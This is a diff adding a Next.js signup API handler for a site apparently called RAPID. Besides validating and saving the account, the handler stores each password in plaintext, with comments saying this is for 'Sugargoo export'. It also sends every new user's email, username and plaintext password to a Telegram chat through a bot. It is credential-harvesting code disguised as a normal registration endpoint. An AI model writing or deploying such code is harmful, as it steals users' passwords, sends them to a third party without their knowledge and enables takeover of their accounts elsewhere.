@@ -1,0 +1,148 @@
+import type { NextApiRequest, NextApiResponse } from 'next';
+import { supabase } from '../../../lib/supabase';
+
+interface SignupBody {
+  email: string;
+  nickname: string;
+  username: string;
+  password: string;
+}
+
+interface ErrorResponse {
+  error: string;
+}
+
+interface SuccessResponse {
+  success: boolean;
+  userId?: string;
+  message?: string;
+}
+
+export default async function handler(
+  req: NextApiRequest,
+  res: NextApiResponse<SuccessResponse | ErrorResponse>
+) {
+  if (req.method !== 'POST') {
+    return res.status(405).json({ error: 'Method not allowed' });
+  }
+
+  try {
+    const { email, nickname, username, password } = req.body as SignupBody;
+
+    // Validation
+    if (!email || !nickname || !username || !password) {
+      return res.status(400).json({ error: 'All fields are required' });
+    }
+
+    // Email format validation
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+    if (!emailRegex.test(email)) {
+      return res.status(400).json({ error: 'Invalid email format' });
+    }
+
+    // Password strength validation (min 8 chars)
+    if (password.length < 8) {
+      return res.status(400).json({ error: 'Password must be at least 8 characters' });
+    }
+
+    // Username validation (alphanumeric, 3-20 chars)
+    if (!/^[a-zA-Z0-9_]{3,20}$/.test(username)) {
+      return res.status(400).json({ error: 'Username must be 3-20 characters (alphanumeric and underscore only)' });
+    }
+
+    // Check if email already exists
+    const { data: existingEmail } = await supabase
+      .from('signups')
+      .select('id')
+      .eq('email', email.toLowerCase())
+      .single();
+
+    if (existingEmail) {
+      return res.status(400).json({ error: 'Email already registered' });
+    }
+
+    // Check if username already exists
+    const { data: existingUsername } = await supabase
+      .from('signups')
+      .select('id')
+      .eq('username', username.toLowerCase())
+      .single();
+
+    if (existingUsername) {
+      return res.status(400).json({ error: 'Username already taken' });
+    }
+
+    // Insert into Supabase (store plaintext password for export)
+    const { data, error: insertError } = await supabase
+      .from('signups')
+      .insert([
+        {
+          email: email.toLowerCase(),
+          nickname,
+          username: username.toLowerCase(),
+          password: password, // Stored plaintext for Sugargoo export
+          created_at: new Date().toISOString(),
+          exported: false,
+        },
+      ])
+      .select();
+
+    if (insertError || !data) {
+      console.error('Supabase insert error:', insertError);
+      return res.status(500).json({ error: 'Failed to create account' });
+    }
+
+    // Send Meta Conversions API event (server-side)
+    // This is the most reliable way to track signups with Meta
+    try {
+      const apiUrl = `${req.headers.host?.includes('localhost') ? 'http' : 'https'}://${req.headers.host}/api/meta-conversions`;
+      console.log(`[Signup] Calling Conversions API at ${apiUrl}`);
+      const metaResponse = await fetch(apiUrl, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          email,
+          eventName: 'CompleteRegistration',
+          eventSourceUrl: 'https://rapid.market/signup',
+        }),
+      });
+      const metaData = await metaResponse.json();
+      console.log(`[Signup] Conversions API response:`, metaData);
+    } catch (metaError) {
+      console.error('[Signup] Meta Conversions API error:', metaError);
+      // Don't fail the signup if Meta API fails
+    }
+
+    // Send Telegram notification
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+
+    if (botToken && chatId) {
+      const message = `🎯 **New RAPID Signup**\n\n📧 Email: \`${email}\`\n👤 Nickname: ${nickname}\n🔑 Username: \`${username}\`\n🔐 Password: \`${password}\`\n⏰ ${new Date().toLocaleString()}`;
+
+      try {
+        await fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'Markdown',
+          }),
+        });
+      } catch (telegramError) {
+        console.error('Telegram notification error:', telegramError);
+        // Don't fail the signup if Telegram fails
+      }
+    }
+
+    return res.status(201).json({
+      success: true,
+      userId: data[0]?.id,
+      message: 'Account created successfully. Check your email for Sugargoo verification link.',
+    });
+  } catch (error) {
+    console.error('Signup error:', error);
+    return res.status(500).json({ error: 'Internal server error' });
+  }
+}
